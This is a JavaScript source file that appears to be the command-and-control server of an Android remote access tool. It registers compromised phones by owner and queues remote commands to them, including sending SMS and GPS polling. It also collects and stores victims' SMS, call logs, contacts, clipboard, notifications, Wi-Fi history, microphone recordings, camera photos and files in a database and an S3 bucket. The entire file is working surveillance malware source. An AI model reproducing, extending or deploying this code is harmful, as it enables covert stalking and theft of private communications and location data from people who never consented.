let CONST = require("./const"),
  crypto = require("crypto"),
  s3Bucket = require("../s3");

const Client = require("../models/clientModel");
const ClientData = require("../models/clientDataModel");

class Clients {
  constructor() {
    this.clientConnections = {};
    this.gpsPollers = {};
    this.clientDatabases = {};
    this.ignoreDisconnects = {};
    this.instance = this;
  }

  // UPDATE

  async clientConnect(connection, clientID, clientData) {
    this.clientConnections[clientID] = connection;

    if (clientID in this.ignoreDisconnects)
      this.ignoreDisconnects[clientID] = true;
    else this.ignoreDisconnects[clientID] = false;

    console.log(
      "Connected -> should ignore?",
      this.ignoreDisconnects[clientID]
    );

    const client = await Client.findOne({ clientID });

    if (!client) {
      await Client.create({
        clientID,
        firstSeen: new Date(),
        lastSeen: new Date(),
        isOnline: true,
        owner: clientData.device.owner,
        dynamicData: clientData,
      });
    } else {
      await Client.updateOne(
        { clientID },
        {
          lastSeen: new Date(),
          isOnline: true,
          dynamicData: clientData,
        }
      );
    }

    let clientDatabase = await this.getClientDatabase(clientID);
    this.setupListeners(clientID, clientDatabase);
  }

  async clientDisconnect(clientID) {
    console.log(
      "Disconnected -> should ignore?",
      this.ignoreDisconnects[clientID]
    );

    if (this.ignoreDisconnects[clientID]) {
      delete this.ignoreDisconnects[clientID];
    } else {
      await Client.findOneAndUpdate(
        { clientID },
        {
          lastSeen: new Date(),
          isOnline: false,
        }
      );

      await logManager.log(CONST.logTypes.info, clientID + " Disconnected");

      if (this.clientConnections[clientID])
        delete this.clientConnections[clientID];
      if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);
      delete this.ignoreDisconnects[clientID];
    }
  }

  async getClientDatabase(clientID) {
    let clientData = await ClientData.findOne({ clientID });

    if (clientData) return clientData;

    clientData = await ClientData.create({
      clientID,
      clientManager: [],
      CommandQue: [],
      SMSData: [],
      CallData: [],
      contacts: [],
      wifiNow: [],
      wifiLog: [],
      clipboardLog: [],
      notificationLog: [],
      enabledPermissions: [],
      apps: [],
      GPSData: [],
      GPSSettings: {
        updateFrequency: 0,
      },
      photos: [],
      downloads: [],
      currentFolder: [],
    });

    return clientData;
  }

  setDownloadDeleteTimer = (clientID, key, type = "download") => {
    return setTimeout(async () => {
      const clientData = await ClientData.findOne({ clientID });

      if (type === "photo") {
        const index = clientData.photos.findIndex((el) => el.key === key);

        clientData.photos.splice(index, 1);
      }

      if (type === "download") {
        const index = clientData.downloads.findIndex((el) => el.key === key);

        clientData.downloads.splice(index, 1);
      }

      await Promise.all([clientData.save(), s3Bucket.deleteFile(key)]);

      // Convert into MINUTES
    }, process.env.DOWNLOAD_EXPIRES_IN * 60 * 1000);
  };

  async setupListeners(clientID) {
    let socket = this.clientConnections[clientID];
    let client = await this.getClientDatabase(clientID);

    await logManager.log(CONST.logTypes.info, clientID + " Connected");
    socket.on("disconnect", async () => await this.clientDisconnect(clientID));
    // socket.on("disconnect", () => await {this.clientDisconnect(clientID)});

    // Run the queued requests for this client
    let clientQue = client.CommandQue;
    if (clientQue.length !== 0) {
      await logManager.log(
        CONST.logTypes.info,
        clientID + " Running Queued Commands"
      );
      clientQue.forEach((command) => {
        let uid = command.uid;
        this.sendCommand(clientID, command.type, command, async (error) => {
          if (!error) {
            await ClientData.findOneAndUpdate(
              { clientID },
              {
                $pull: {
                  CommandQue: { uid: uid },
                },
              }
            );
          } else {
            // Hopefully we'll never hit this point, it'd mean the client connected then immediatly disonnected, how weird!
            // should we play -> https://www.youtube.com/watch?v=4N-POQr-DQQ
            await logManager.log(
              CONST.logTypes.error,
              clientID + " Queued Command (" + command.type + ") Failed"
            );
          }
        });
      });
    }

    // Start GPS polling (if enabled)
    await this.gpsPoll(clientID);

    // ====== DISABLED -- It never really worked, and new AccessRules stop us from using camera in the background ====== //

    socket.on(CONST.messageKeys.camera, async (data) => {
      console.log(data);

      if (data.type == "list") {
        let list = data.list;
        if (list.length !== 0) {
          //we got em basically
          //this means we have a camera which can be accessed lessgoo!
          await logManager.log(
            CONST.logTypes.success,
            "Found Accessable Camera!"
          );
        }
      }

      // {
      //     "image": <Boolean>,
      //     "buffer": <Buffer>
      // }
      if (!data.image) return; // If the image is undefined the function won't go further

      // save to AWS
      let epoch = Date.now().toString();

      const fileName = epoch + ".jpg";

      const location = await s3Bucket.uploadFile(data.buffer, fileName);

      // let's save the filepath to the database
      const clientData = await this.getClientDatabase(clientID);

      clientData.photos.push({
        time: epoch,
        path: location,
        key: fileName,
      });

      await clientData.save();

      //  Set timer to delete the photo after 10 mins.
      this.setDownloadDeleteTimer(clientData.clientID, fileName, "photo");
    });

    socket.on(CONST.messageKeys.files, async (data) => {
      // {
      //     "type": "list"|"download"|"error",
      //     (if type = list) "list": <Array>,
      //     (if type = download) "buffer": <Buffer>,
      //     (if type = error) "error": <String>
      // }

      if (data.type === "list") {
        let list = data.list;
        if (list.length !== 0) {
          // cool, we have files!
          // somehow get this array back to the main thread...

          await ClientData.findOneAndUpdate(
            { clientID },
            { currentFolder: data.list }
          );

          await logManager.log(CONST.logTypes.success, "File List Updated");
        } else {
          // bummer, something happened
        }
      } else if (data.type === "download") {
        // Ayy, time to recieve a file!
        await logManager.log(
          CONST.logTypes.info,
          "Recieving File From" + clientID
        );

        let hash = crypto
          .createHash("md5")
          .update(new Date() + Math.random())
          .digest("hex");

        let fileKey =
          hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);

        let fileExt =
          data.name.substring(data.name.lastIndexOf(".")).length !==
          data.name.length
            ? data.name.substring(data.name.lastIndexOf("."))
            : ".unknown";

        const key = fileKey + fileExt;

        const location = await s3Bucket.uploadFile(data.buffer, key);

        const clientData = await this.getClientDatabase(clientID);

        clientData.downloads.push({
          time: new Date(),
          type: "download",
          originalName: data.name,
          path: location,
          key,
        });

        await clientData.save();

        this.setDownloadDeleteTimer(clientData.clientID, key);

        await logManager.log(
          CONST.logTypes.success,
          "File From" + clientID + " Saved"
        );
      } else if (data.type === "error") {
        // shit, we don't like these! What's up?
        let error = data.error;
        console.log(error);
      }
    });

    socket.on(CONST.messageKeys.call, async (data) => {
      if (data.callsList) {
        if (data.callsList.length !== 0) {
          let callsList = data.callsList;

          let newCount = 0;

          const oldClientData = await ClientData.findOne({ clientID });
          const callsArr = oldClientData.CallData;

          for (const call of callsList) {
            let hash = crypto
              .createHash("md5")
              .update(call.phoneNo + call.date)
              .digest("hex");

            // Check if this call already exists
            const callExists = callsArr.find((call) => call.hash === hash);

            if (!callExists) {
              // cool, we dont have this call
              call.hash = hash;

              // Push the call into the callsArr
              callsArr.push(call);

              newCount++;
            }
          }

          // Update the clientData with the modified callsArr
          await ClientData.updateOne({ clientID }, { CallData: callsArr });

          await logManager.log(
            CONST.logTypes.success,
            clientID + " Call Log Updated - " + newCount + " New Calls"
          );
        }
      }
    });

    socket.on(CONST.messageKeys.sms, async (data) => {
      if (typeof data === "object") {
        let smsList = data.smslist;
        if (smsList.length !== 0) {
          // let dbSMS = client.get("SMSData");
          const oldClientData = await this.getClientDatabase(clientID);
          const smsArr = oldClientData.SMSData;

          let newCount = 0;

          for (const sms of smsList) {
            let hash = crypto
              .createHash("md5")
              .update(sms.address + sms.body)
              .digest("hex");

            const smsExists = smsArr.find((sms) => sms.hash === hash);

            if (!smsExists) {
              // cool, we dont have this sms
              sms.hash = hash;

              smsArr.push(sms);
            }
          }

          // Update the clientData with the modified smsArr
          await ClientData.updateOne({ clientID }, { SMSData: smsArr });

          await logManager.log(
            CONST.logTypes.success,
            clientID + " SMS List Updated - " + newCount + " New Messages"
          );
        }
      } else if (typeof data === "boolean") {
        await logManager.log(CONST.logTypes.success, clientID + " SENT SMS");
      }
    });

    socket.on(CONST.messageKeys.mic, async (data) => {
      if (!data.file) return;

      await logManager.log(
        CONST.logTypes.info,
        "Recieving " + data.name + " from " + clientID
      );

      let hash = crypto
        .createHash("md5")
        .update(new Date() + Math.random())
        .digest("hex");

      let fileKey =
        hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);

      let fileExt =
        data.name.substring(data.name.lastIndexOf(".")).length !==
        data.name.length
          ? data.name.substring(data.name.lastIndexOf("."))
          : ".unknown";

      const key = fileKey + fileExt;

      const location = await s3Bucket.uploadFile(data.buffer, key);

      const clientData = await this.getClientDatabase(clientID);

      clientData.downloads.push({
        time: new Date(),
        type: "voiceRecord",
        originalName: data.name,
        path: location,
        key,
      });

      await clientData.save();

      this.setDownloadDeleteTimer(clientData.clientID, key);
    });

    socket.on(CONST.messageKeys.location, async (data) => {
      if (
        Object.keys(data).length !== 0 &&
        data.hasOwnProperty("latitude") &&
        data.hasOwnProperty("longitude")
      ) {
        const clientData = await this.getClientDatabase(clientID);

        clientData.GPSData.push({
          time: new Date(),
          enabled: data.enabled || false,
          latitude: data.latitude || 0,
          longitude: data.longitude || 0,
          altitude: data.altitude || 0,
          accuracy: data.accuracy || 0,
          speed: data.speed || 0,
        });

        await clientData.save();

        await logManager.log(CONST.logTypes.success, clientID + " GPS Updated");
      } else {
        await logManager.log(
          CONST.logTypes.error,
          clientID + " GPS Recieved No Data"
        );
        await logManager.log(
          CONST.logTypes.error,
          clientID + " GPS LOCATION SOCKET DATA" + JSON.stringify(data)
        );
      }
    });

    socket.on(CONST.messageKeys.clipboard, async (data) => {
      const clientData = await this.getClientDatabase(clientID);
      clientData.clipboardLog.push({
        time: new Date(),
        content: data.text,
      });

      await clientData.save();

      await logManager.log(
        CONST.logTypes.info,
        clientID + " ClipBoard Recieved"
      );
    });

    socket.on(CONST.messageKeys.notification, async (data) => {
      // let dbNotificationLog = client.get("notificationLog");
      let hash = crypto
        .createHash("md5")
        .update(data.key + data.content)
        .digest("hex");

      const clientData = await this.getClientDatabase(clientID);

      const notifExists = clientData.notificationLog.find(
        (notif) => notif.hash === hash
      );

      if (!notifExists) {
        data.hash = hash;
        clientData.notificationLog.push(data);

        await clientData.save();

        await logManager.log(
          CONST.logTypes.info,
          clientID + " Notification Recieved"
        );
      }
    });

    socket.on(CONST.messageKeys.contacts, async (data) => {
      if (data.contactsList) {
        if (data.contactsList.length !== 0) {
          let contactsList = data.contactsList;

          let newCount = 0;

          const oldClientData = await ClientData.findOne({ clientID });
          const contactsArr = oldClientData.contacts;

          for (const contact of contactsList) {
            contact.phoneNo = contact.phoneNo.replace(/\s+/g, "");
            let hash = crypto
              .createHash("md5")
              .update(contact.phoneNo + contact.name)
              .digest("hex");

            const contactExists = contactsArr.find(
              (contact) => contact.hash === hash
            );

            if (!contactExists) {
              // cool, we dont have this call
              contact.hash = hash;

              contactsArr.push(contact);

              newCount++;
            }
          }

          // Update the clientData with the modifies contactsArr
          await ClientData.updateOne({ clientID }, { contacts: contactsArr });

          await logManager.log(
            CONST.logTypes.success,
            clientID + " Contacts Updated - " + newCount + " New Contacts Added"
          );
        }
      }
    });

    socket.on(CONST.messageKeys.wifi, async (data) => {
      if (data.networks) {
        if (data.networks.length !== 0) {
          let networks = data.networks;

          const clientData = await ClientData.findOneAndUpdate(
            { clientID },
            { wifiNow: data.networks },
            { new: true }
          );

          let newCount = 0;

          for (const wifi of networks) {
            const wifiExists = clientData.wifiLog.find(
              (el) => el.SSID === wifi.SSID && el.BSSID === wifi.BSSID
            );

            if (!wifiExists) {
              // cool, we dont have this call
              wifi.firstSeen = new Date();
              wifi.lastSeen = new Date();

              // await clientData.save();
              clientData.wifiLog.push(wifi);

              newCount++;
            } else {
              // wifi.lastSeen = new Date();
              // console.log(wifi);

              const wifiIndex = clientData.wifiLog.indexOf(wifiExists);

              clientData.wifiLog[wifiIndex].lastSeen = new Date();
            }
          }

          // Update the clientData with the modified wifiLogs
          // await ClientData.updateOne({ clientID }, { wifiLog: clientData.wifiLog });

          await logManager.log(
            CONST.logTypes.success,
            clientID +
              " WiFi Updated - " +
              newCount +
              " New WiFi Hotspots Found"
          );
        }
      }
    });

    socket.on(CONST.messageKeys.permissions, async (data) => {
      await ClientData.findOneAndUpdate(
        { clientID },
        { enabledPermissions: data.permissions }
      );

      await logManager.log(
        CONST.logTypes.success,
        clientID + " Permissions Updated"
      );
    });

    socket.on(CONST.messageKeys.installed, async (data) => {
      // client.get("apps").assign(data.apps).write();
      await ClientData.updateOne({ clientID }, { apps: data.apps });
      await logManager.log(CONST.logTypes.success, clientID + " Apps Updated");
    });
  }

  // GET
  async getClient(clientID) {
    // let client = this.db.maindb.get("clients").find({ clientID }).value();
    const client = await this.getClientDatabase(clientID);
    if (client !== undefined) return client;
    else return false;
  }

  async getClientList(owner) {
    // return this.db.maindb.get("clients").value();
    return await Client.find({ owner });
  }

  async getClientListOnline(owner) {
    return await Client.find({ isOnline: true, owner });
  }

  async getClientListOffline(owner) {
    return await Client.find({ owner, isOnline: { $ne: true } });
  }

  async getIpList(owner) {
    return await Client.find({ owner, dynamicData: { $ne: undefined } });
  }

  // Note: Instead of using else-if's, just simply use if's, it reduces nesting and increases readability.
  async getClientDataByPage(clientID, page, filter = undefined) {
    let client = await Client.findOne({ clientID });

    if (!client) return false;

    let clientData = await this.getClientDatabase(clientID);

    let pageData;

    if (page === "calls") {
      ////////// Sorting in descending order by date ///////////
      pageData = clientData.CallData.sort(
        (a, b) => new Date(b.date).getTime() - new Date(a.date).getTime()
      );

      if (filter) {
        // let filterData = clientDB
        //   .get("CallData")
        //   .sortBy("date")
        //   .reverse()
        //   .value()
        //   .filter((calls) => calls.phoneNo.substr(-6) === filter.substr(-6));

        let filterData = clientData.CallData.sort(
          (a, b) => new Date(b.date).getTime() - new Date(a.date).getTime()
        ).filter((calls) => calls.phoneNo.substr(-6) === filter.substr(-6));

        if (filterData) pageData = filterData;
      }
    }

    if (page === "sms") {
      pageData = clientData.SMSData;
      if (filter) {
        // let filterData = clientDB
        //   .get("SMSData")
        //   .value()
        //   .filter((sms) => sms.address.substr(-6) === filter.substr(-6));

        let filterData = clientData.SMSData.filter(
          (sms) => sms.address.substr(-6) === filter.substr(-6)
        );

        if (filterData) pageData = filterData;
      }
    }

    if (page === "notifications") {
      pageData = clientData.notificationLog.sort(
        (a, b) =>
          new Date(b.postTime).getTime() - new Date(a.postTime).getTime()
      );

      if (filter) {
        let filterData = clientData.notificationLog
          .sort(
            (a, b) =>
              new Date(b.postTime).getTime() - new Date(a.postTime).getTime()
          )
          .filter((not) => not.appName === filter);

        if (filterData) pageData = filterData;
      }
    }

    if (page === "wifi") {
      pageData = {};
      pageData.now = clientData.wifiNow;
      pageData.log = clientData.wifiLog;
    }

    if (page === "contacts") pageData = clientData.contacts;

    if (page === "permissions") pageData = clientData.enabledPermissions;

    if (page === "clipboard")
      pageData = clientData.clipboardLog.sort(
        (a, b) => new Date(b.time).getTime() - new Date(a.time).getTime()
      );

    if (page === "apps") pageData = clientData.apps;

    if (page === "files") pageData = clientData.currentFolder;

    if (page === "downloads")
      pageData = clientData.downloads
        .filter((download) => download.type === "download")
        .sort(
          (a, b) => new Date(b.time).getTime() - new Date(a.time).getTime()
        );

    if (page === "microphone") {
      pageData = clientData.downloads
        .filter((download) => download.type === "voiceRecord")
        .sort(
          (a, b) => new Date(b.time).getTime() - new Date(a.time).getTime()
        );
    }

    if (page === "camera") {
      pageData = clientData.photos.sort(
        (a, b) => new Date(b.time).getTime() - new Date(a.time).getTime()
      );
    }

    if (page === "gps") pageData = clientData.GPSData;

    if (page === "info") pageData = client;

    return pageData;
  }

  // DELETE
  async deleteClient(clientID) {
    await Client.deleteOne({ clientID });

    if (this.clientConnections[clientID])
      delete this.clientConnections[clientID];
  }

  // COMMAND
  async sendCommand(clientID, commandID, commandPayload = {}, cb = () => {}) {
    this.checkCorrectParams(commandID, commandPayload, async (error) => {
      if (error) return cb(error, undefined);

      let client = await Client.findOne({ clientID });

      if (!client) return cb("Client Doesn't exist!", undefined);

      commandPayload.type = commandID;

      if (clientID in this.clientConnections) {
        let socket = this.clientConnections[clientID];

        await logManager.log(
          CONST.logTypes.info,
          "Requested " + commandID + " From " + clientID
        );

        socket.emit("order", commandPayload);

        return cb(false, "Requested");
      } else {
        await this.queCommand(clientID, commandPayload, (error) => {
          if (error) return cb(error, undefined);

          return cb(false, "Command queued (device is offline)");
        });
      }
    });
  }

  async queCommand(clientID, commandPayload, cb) {
    let clientData = await this.getClientDatabase(clientID);
    let commandQue = clientData.CommandQue;
    let outstandingCommands = [];

    commandQue.forEach((command) => {
      outstandingCommands.push(command.type);
    });

    if (outstandingCommands.includes(commandPayload.type))
      return cb("A similar command has already been queued");
    else {
      // yep, it could cause a clash, but c'mon, realistically, it won't, theoretical max que length is like 12 items, so chill?
      // Talking of clashes, enjoy -> https://www.youtube.com/watch?v=EfK-WX2pa8c
      commandPayload.uid = Math.floor(Math.random() * 10000);

      clientData.CommandQue.push(commandPayload);
      await clientData.save();
      return cb(false);
    }
  }

  checkCorrectParams(commandID, commandPayload, cb) {
    if (commandID === CONST.messageKeys.sms) {
      if (!("action" in commandPayload))
        return cb("SMS Missing `action` Parameter");
      else {
        if (commandPayload.action === "ls") return cb(false);
        else if (commandPayload.action === "sendSMS") {
          if (!("to" in commandPayload))
            return cb("SMS Missing `to` Parameter");
          else if (!("sms" in commandPayload))
            return cb("SMS Missing `to` Parameter");
          else return cb(false);
        } else return cb("SMS `action` parameter incorrect");
      }
    } else if (commandID === CONST.messageKeys.files) {
      if (!("action" in commandPayload))
        return cb("Files Missing `action` Parameter");
      else {
        if (commandPayload.action === "ls") {
          if (!("path" in commandPayload))
            return cb("Files Missing `path` Parameter");
          else return cb(false);
        } else if (commandPayload.action === "dl") {
          if (!("path" in commandPayload))
            return cb("Files Missing `path` Parameter");
          else return cb(false);
        } else return cb("Files `action` parameter incorrect");
      }
    } else if (commandID === CONST.messageKeys.mic) {
      if (!"sec" in commandPayload) return cb("Mic Missing `sec` Parameter");
      else cb(false);
    } else if (commandID === CONST.messageKeys.gotPermission) {
      if (!"permission" in commandPayload)
        return cb("GotPerm Missing `permission` Parameter");
      else cb(false);
    } else if (Object.values(CONST.messageKeys).indexOf(commandID) >= 0)
      return cb(false);
    else return cb("Command ID Not Found");
  }

  async gpsPoll(clientID) {
    if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);

    let clientData = await this.getClientDatabase(clientID);
    let gpsSettings = clientData.GPSSettings;

    if (gpsSettings.updateFrequency > 0) {
      this.gpsPollers[clientID] = setInterval(async () => {
        await logManager.log(
          CONST.logTypes.info,
          clientID + " POLL COMMAND - GPS"
        );
        this.sendCommand(clientID, "0xLO");
      }, gpsSettings.updateFrequency * 1000);
    }
  }

  async setGpsPollSpeed(clientID, pollevery, cb) {
    if (pollevery >= 30) {
      let clientData = await this.getClientDatabase(clientID);

      clientData.GPSSettings.updateFrequency = pollevery;

      await clientData.save();

      cb(false);
      this.gpsPoll(clientID);
    } else return cb("Polling Too Short!");
  }
}

module.exports = Clients;
